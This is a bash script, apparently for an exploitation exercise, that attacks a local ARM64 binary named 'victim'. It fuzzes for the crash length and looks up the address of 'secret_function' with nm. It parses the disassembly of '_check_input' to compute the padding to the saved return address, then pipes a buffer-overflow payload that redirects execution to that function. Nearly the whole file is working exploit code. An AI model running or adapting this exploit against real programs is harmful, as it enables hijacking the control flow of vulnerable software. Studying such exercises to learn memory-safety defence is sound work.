#!/bin/bash

CRASH_POINT=1

while true; do
    echo -n "Trying $CRASH_POINT bytes... "
    INPUT=$(python3 -c "print('A' * $CRASH_POINT)")
    RESULT=$(echo "$INPUT" | ./victim 2>/dev/null)
    EXIT_CODE=$?

    if [[ $EXIT_CODE -ne 0 ]]; then
        echo "CRASH! (exit code $EXIT_CODE)"
        echo "Crash point: $CRASH_POINT bytes"
        break
    else
        echo "ok"
    fi

    ((CRASH_POINT++))
done

ADDR=0x$(nm ./victim | grep secret_function | awk '{print $1}')
echo "secret_function is at: $ADDR"

# Parse the exact buffer and return address offsets from the disassembly.
#   sub sp, sp, #N       → total frame size
#   stp x29, x30, [sp, #M] → FP at sp+M, return address (LR) at sp+M+8
#   add x0, sp, #B       → buffer starts at sp+B (the arg passed to gets)
# Padding = (M + 8) - B  → distance from buffer start to return address.

DISASM=$(objdump -d ./victim | grep -A 45 "<_check_input>:")
FRAME=$(echo "$DISASM" | grep "sub.*sp, sp" | head -1 | awk '{print $NF}' | tr -d '#')
STP_OFFSET=$(echo "$DISASM" | grep "stp.*x29, x30" | head -1 | awk '{print $NF}' | tr -d '[]#')
# Buffer offset: the "add x0, sp, #N" that loads the buffer address.
# Skip the frame pointer setup (add x29, sp) — take the next "add ..., sp, #".
BUF_OFFSET=$(echo "$DISASM" | grep "add.*x0, sp" | head -1 | awk '{print $NF}' | tr -d '#')

RET_OFFSET=$((STP_OFFSET + 8))
PADDING=$((RET_OFFSET - BUF_OFFSET))

echo "Stack frame: $FRAME bytes"
echo "x29/x30 saved at: sp+$STP_OFFSET / sp+$RET_OFFSET"
echo "Buffer starts at: sp+$BUF_OFFSET"
echo "Padding to return address: $PADDING bytes"

python3 -c "
import struct, sys
padding = b'A' * $PADDING
payload = padding + struct.pack('<Q', $ADDR)
sys.stdout.buffer.write(payload)
" | ./victim